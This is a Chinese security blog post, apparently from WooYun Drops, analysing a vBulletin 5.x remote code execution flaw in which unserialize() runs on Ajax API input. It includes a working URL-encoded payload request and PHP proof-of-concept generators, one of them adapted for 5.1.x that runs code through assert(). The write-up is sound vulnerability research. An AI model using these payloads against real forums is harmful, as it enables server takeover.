@@ -1,0 +1,272 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">unserialize() 实战之 vBulletin 5.x.x 远程代码执行</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          RickGray</a>
+        <span class="bull">·</span>
+        <time title="2015/11/10 12:04" ui-time="" datetime="2015/11/10 12:04" class="published ng-binding ng-isolate-scope">2015/11/10 12:04</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><p><strong>Author: RickGray (知道创宇404安全实验室)</strong></p>
+
+<p>近日，vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 <code>unserialize()</code> 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。关于 PHP 中反序列化漏洞的问题可以参考 OWASP 的<a href="https://www.owasp.org/index.php/PHP_Object_Injection">《PHP Object Injection》</a>。</p>
+
+<p>使用 <a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq">原文</a> 提供的 Payload 可以直接在受影响的站点上执行 <code>phpinfo(1)</code>：</p>
+
+<p><img alt="" img-src="9a9dab0b95937138a5f7b79382fdf7ec1743a774.jpg"></p>
+
+<!--more-->
+
+<p>具体 Payload 的构造过程也文中有所提及，但是笔者在对 vBulletin 5.1.x 版本进行测试的时候，发现原本的 Payload 并不能成功，甚是疑惑。然而在深入分析后，发现在具体利用的时候还需要结合 vBulletin 程序本身的一些代码结构才能得到一个较为通用的 Payload，通过下面的分析后就能够明白。</p>
+
+<h1>0x00 反序列化触发点跟踪</h1>
+
+<hr>
+
+<p>虽然此次漏洞 <code>unserialize()</code> 函数的触发在曝光的文章中已经描述的很清楚了，并且对整个关键代码的触发流程也进行了说明，但是在深入跟踪和分析时，觉得还是有值得注意和学习的地方。</p>
+
+<pre><code>http://172.16.96.130/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D
+</code></pre>
+
+<p>通过观察服务端在处理PHP时的调用栈，可知服务端在处理上述请求时，会将 <code>ajax/api/hook/decodeArguments</code> 作为路由参数 <code>$_REQUEST['routestring']</code> 传递给地址路由处理过程。因其符合 <code>ajax/api/[controller]/[method]</code> 的 Ajax API 请求路由格式，会再调用 <code>vB5_Frontend_ApplicationLight</code> 实例中的 <code>handleAjaxApi()</code> 函数来进行相应的模块加载并调用处理函数：</p>
+
+<pre><code>#!php
+protected function handleAjaxApi()
+{
+    $routeInfo = explode('/', $_REQUEST['routestring']);    
+
+    if (count($routeInfo) &lt; 4)
+    {
+        throw new vB5_Exception_Api('ajax', 'api', array(), 'invalid_request');
+    }
+    $params = array_merge($_POST, $_GET);
+    $this-&gt;sendAsJson(Api_InterfaceAbstract::instance(Api_InterfaceAbstract::API_LIGHT)-&gt;callApi($routeInfo[2], $routeInfo[3], $params, true));
+}
+</code></pre>
+
+<p>请求的 <code>ajax/api/hook/decodeArguments</code> 会实例化 <code>hook</code> 类然后调用 <code>decodeArguments()</code> 函数，原文中所提及的触发点就在此处：</p>
+
+<pre><code>#!php
+public function decodeArguments($arguments)
+{
+    if ($args = @unserialize($arguments))
+    {
+        $result = '';
+
+        foreach ($args AS $varname =&gt; $value)
+        {
+            $result .= $varname;
+</code></pre>
+
+<p>通过反序列化，我们可以使之能生成在执行环境上下文中已经定义好了的类实例，并通过寻找一个含有 <code>__wakeup()</code> 或者 <code>__destruct()</code> 魔术方法存在问题的类来进行利用。然后原文中所提到的利用方法并不是这样，其使用的是继承于 PHP 迭代器类型的 <code>vB_dB_Result</code> 类，由于 <code>$args = @unserialize($arguments)</code> 产生了一个迭代器 <code>vB_dB_Result</code> 类实例，因此在后面进行 <code>foreach</code> 操作时会首先调用其 <code>rewind()</code> 函数。</p>
+
+<p>而在 <code>rewind()</code> 函数处理过程中，会根据实例变量状态进行调用：</p>
+
+<pre><code>#!php
+public function rewind()
+{
+    if ($this-&gt;recordset)
+    {
+        $this-&gt;db-&gt;free_result($this-&gt;recordset);
+    }
+</code></pre>
+
+<p>这里就可以通过反序列化来控制 <code>$this-&gt;recordset</code> 的值，并且 <code>$this-&gt;db-&gt;free_result</code> 最终会调用：</p>
+
+<pre><code>#!php
+function free_result($queryresult)
+{
+    $this-&gt;sql = '';
+    return @$this-&gt;functions['free_result']($queryresult);
+}
+</code></pre>
+
+<p><code>$this-&gt;functions['free_result']</code> 原本的初始化值为 <code>mysql_free_result</code>，但是由于反序列化的原因，我们也能控制 <code>vB_dB_Result</code> 类实例中的 <code>db</code> 成员，更改其对应的 <code>functions['free_result']</code> 为我们想要执行的函数，因此一个任意代码执行就产生了。</p>
+
+<h1>0x01 利用分析和完善</h1>
+
+<hr>
+
+<p>观察一下原文中提供的 Payload 构造 PoC：</p>
+
+<pre><code>#!php
+&lt;?php
+class vB_Database {
+       public $functions = array();
+       public function __construct() {
+               $this-&gt;functions['free_result'] = 'phpinfo';
+       }
+}    
+
+class vB_dB_Result {
+       protected $db;
+       protected $recordset;
+       public function __construct() {
+               $this-&gt;db = new vB_Database();
+               $this-&gt;recordset = 1;
+       }
+}    
+
+print urlencode(serialize(new vB_dB_Result())) . "\n";
+</code></pre>
+
+<p>通过第一部分的分析，我们已经清楚了整个漏洞的函数调用过程和原因，并且也已经得知哪些参数可以得到控制和利用。因此这里我们修改 <code>$this-&gt;functions['free_result'] = 'assert';</code> 和 <code>$this-&gt;recordset = 'var_dump(md5(1))';</code>，最终远程代码执行的的函数则会是 <code>assert('var_dump(md5(1))')</code>：</p>
+
+<p><img alt="" img-src="89a17ff27bf97951fb38ecd5eca2bf1ded53a966.jpg"></p>
+
+<p>这个时候其实 RCE 已经非常的顺利了，但是在进行测试的时候却发现了原文所提供的 PoC 只能复现 5.0.x 版本的 vBulletin，而 5.1.x 版本的却不可以。通过本地搭建测试环境，并使用同样的 PoC 去测试，发现在 5.1.x 版本中 <code>vB_Database</code> 被定义成了抽象类：</p>
+
+<pre><code>#!php
+abstract class vB_Database
+{
+    /**
+     * The type of result set to return from the database for a specific row.
+     */
+</code></pre>
+
+<p>抽象类是不能直接进行实例化的，原文提供的 PoC 却是实例化的 <code>vB_Database</code> 类作为 <code>vB_dB_Result</code> 迭代器成员 <code>db</code> 的值，在服务端进行反序列化时会因为需要恢复实例为抽象类而导致失败：</p>
+
+<p><img alt="" img-src="8a164380c6a502dd11ab618442f45d758e96cee9.jpg"></p>
+
+<p>这就是为什么在 5.1.x 版本上 PoC 会不成功的原因。然后要解决这个问题也很容易，通过跟踪调用栈，发现程序在反序列化未定义类时会调用程序注册的 <code>autoload()</code> 方法去动态加载类文件。这里 vBulletin 会依次调用 <code>includes/vb5/autoloader.php</code> 中的 <code>_autoload</code> 方法和 <code>core/vb/vb.php</code> 中的 <code>autoload()</code> 方法，成功加载即返回，失败则反序列化失败。所以要想继续使用原有 PoC 的思路来让反序列化后会执行 <code>$this-&gt;db-&gt;free_result($this-&gt;recordset);</code> 则需要找到一个继承于 <code>vB_Database</code> 抽象类的子类并且其源码文件路径能够在 autoload 过程中得到加载。</p>
+
+<p>通过搜索，发现有如下类继承于 <code>vB_Database</code> 抽象类及其源码对应的路径：</p>
+
+<p><img alt="" img-src="2eee7cf0ada9d2b5faf3aaba0b6586fb9f5dbd85.jpg"></p>
+
+<p>而终代码进行进行 autoload 的时候会解析传递的类名来动态构造尝试加载的源码文件路径：</p>
+
+<pre><code>#!php
+...省略
+    $fname = str_replace('_', '/', strtolower($class)) . '.php';    
+
+    foreach (self::$_paths AS $path)
+    {
+        if (file_exists($path . $fname))
+        {
+            include($path . $fname);
+            if (class_exists($class, false))
+            {
+                return true;
+            }
+</code></pre>
+
+<p>上面这段代码存在于第一次调用的 <code>__autoload()</code> 里，可以看到对提供的类名以 <code>_</code> 进行了拆分，动态构造了加载路径（第二次 autoload() 的过程大致相同），简单分析一下就可以发现只有在反序列化 <code>vB_Database_MySQL</code> 和 <code>vB_Database_MySQLi</code> 这两个基于 <code>vB_Database</code> 抽象类的子类时，才能成功的动态加载其类定义所在的源码文件使得反序列化成功执行，最终才能控制参数进行任意代码执行。</p>
+
+<p>所以，针对 5.1.x 版本 vBulletin 的 PoC 就可以得到了，使用 <code>vB_Database_MySQL</code> 或者 <code>vB_Database_MySQLi</code> 作为迭代器 <code>vB_dB_Result</code> 成员 <code>db</code> 的值即可。具体 PoC 如下：</p>
+
+<pre><code>#!php
+&lt;?php
+class vB_Database_MySQL {
+       public $functions = array();
+       public function __construct() {
+               $this-&gt;functions['free_result'] = 'assert';
+       }
+}    
+
+class vB_dB_Result {
+       protected $db;
+       protected $recordset;
+       public function __construct() {
+               $this-&gt;db = new vB_Database_MySQL();
+               $this-&gt;recordset = 'print("This Vuln In 5.1.7")';
+       }
+}    
+
+print urlencode(serialize(new vB_dB_Result())) . "\n";
+</code></pre>
+
+<p>测试一下，成功执行 <code>assert('print("This Vuln In 5.1.7")')</code>：</p>
+
+<p><img alt="" img-src="a1f2e19140668f78bf74639e61109d73c8764b3f.jpg"></p>
+
+<p>当然了，PoC 不止上面所提供的这一种写法，仅供参考而已。</p>
+
+<h1>0x02 小结</h1>
+
+<hr>
+
+<p>此次 vBulletin 5.x.x RCE 漏洞的曝光，从寻找触发点到对象的寻找，再到各种自动加载细节，不得不说是一个很好的 PHP 反序列化漏洞实战实例。不仔细去分析真的不能发现原作者清晰的思路和对程序的熟悉程度。</p>
+
+<p>另外，<a href="http://blog.checkpoint.com/">Check Point</a> 在其官方博客上也公布了反序列化的另一个利用点，通过反序列化出一个模版对象最终调用 <code>eval()</code> 函数进行执行（<a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/">原文</a>）。</p>
+
+<h1>0x03 参考</h1>
+
+<hr>
+
+<ul>
+<li><a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq">http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq</a></li>
+<li><a href="https://www.owasp.org/index.php/PHP_Object_Injection">https://www.owasp.org/index.php/PHP&#95;Object&#95;Injection</a></li>
+<li><a href="http://php.net/manual/en/class.iterator.php">http://php.net/manual/en/class.iterator.php</a></li>
+<li><a href="http://www.php.net/manual/en/function.autoload.php">http://www.php.net/manual/en/function.autoload.php</a></li>
+<li><a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/">http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/</a></li>
+<li><a href="http://www.sebug.net/vuldb/ssvid-89707">http://www.sebug.net/vuldb/ssvid-89707</a></li>
+</ul>
+
+<p>原文出处：<a href="http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/">http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/</a></p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          <div id="donate" style="padding: 10px;border-top: 1px solid #d9d9d9;text-align: center;"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20160229102335edc9f9b0adc0d0c871c297da5deb1bee.png" style="width:200px; height:200px"></div>
+  <!-- collect end -->
+  <!-- recommend -->
+  <div class="yarpp-related">
+<h3>为您推荐了适合您的技术文章:</h3>
+<ol id="recommandsystem">
+		<li><a href="http://drops.wooyun.org/papers/8261" rel="bookmark" id="re1">vBulletin rce 0day分析</a></li>
+			<li><a href="http://drops.wooyun.org/papers/4820" rel="bookmark" id="re2">理解php对象注入</a></li>
+			<li><a href="http://drops.wooyun.org/papers/10642" rel="bookmark" id="re3">三星安卓5.0设备WifiCredService 远程代码执行</a></li>
+			<li><a href="http://drops.wooyun.org/papers/596" rel="bookmark" id="re4">WordPress < 3.6.1 PHP 对象注入漏洞</a></li>
+	 
+</ol>
+</div>
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Manning</span>
+                 <span class="reply-time">2015-11-10 17:27:43</span>
+        </div>
+        <p></p><p>不错</p>
+<p></p>
+        
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
